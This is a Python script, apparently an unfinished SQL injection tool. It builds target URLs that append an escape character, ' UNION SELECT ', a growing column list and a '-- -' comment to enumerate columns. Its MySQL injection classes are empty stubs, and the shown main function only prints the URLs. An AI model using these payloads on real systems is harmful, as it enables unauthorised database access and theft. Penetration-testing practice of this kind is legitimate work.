#!/bin/python3
import argparse
import urllib.request
import gzip

###### HTTP request ######

class HTTPrequest():
    """ Sends HTTP request and retrieves response. """

    def __init__(self, url, header, data=None):
        self.url = url
        self.header = self._format_header(header)
        self.data = data
        self.request = urllib.request.Request(self.url, self.data, self.header)
        self.response = None


    def send_request(self):
        """ Send HTTP request and decompress response if gzip compressed. """
        with urllib.request.urlopen(self.request) as response:
            self.response = response.read()
            # Check if gzip compressed.
            if self.response[0:2] == b'\x1f\x8b':
                self.response = gzip.decompress(self.response)

    def get_response(self):
        """ Return HTTP response. """
        return self.response

    def _format_header(self, header):
        """ Format list of headers input from cli and return a dict.  """
        self.header_list = header.split(", ")
        self.header_dict = dict()
        for i in range(len(self.header_list)):
            self.header_list[i] = self.header_list[i].strip()
            self.header_seperate = self.header_list[i].split(": ")
            self.header_dict[self.header_seperate[0]] = self.header_seperate[1]

        return self.header_dict


###### Iterator ######

class Iterator(HTTPrequest):

    def __init__(self, url, header, data=None, first_escape="", query="", last_escape=""):
        super().__init__(url, header, data)
        self.query = query
        self.first_escape = first_escape
        self.last_escape = last_escape

    def iterate_columns(self):
        self.delim = ", "
        self.column = ""
        for i in range(1, 20):
            self.column += str(i) + self.delim
            self.new_url = self.url + self.first_escape + self.query + self.column + self.last_escape
            print('New url: ' + self.new_url)


###### Injection base class ######

class BaseInjection(Iterator):

    def __init__(self):
        pass


    def find_columns(self):
        pass


###### MySQL ######

class MySQLunion(BaseInjection):

    def __init__(self):
        pass




###### Command line parser ######
parser = argparse.ArgumentParser()

parser.add_argument("url", help="url of target in format http://x.x.x.x:port/path")
parser.add_argument("-H", "--header", help="Header values in comma seperated list. See README for formatting. ex. Host: x.x.x.x, Accept: text/html")
parser.add_argument("-fE", "--firstesc", help="First escape character used in query. ex. -fE '")
parser.add_argument("-lE", "--lastesc", help="Last escape character used in query, usually a comment. ex. -- -")

###### Main function ######
def main():
    args = parser.parse_args()
    it = Iterator(args.url, args.header, first_escape=args.firstesc, query=" UNION SELECT ", last_escape=args.lastesc)
    it.iterate_columns()
if __name__ == "__main__":
    main()
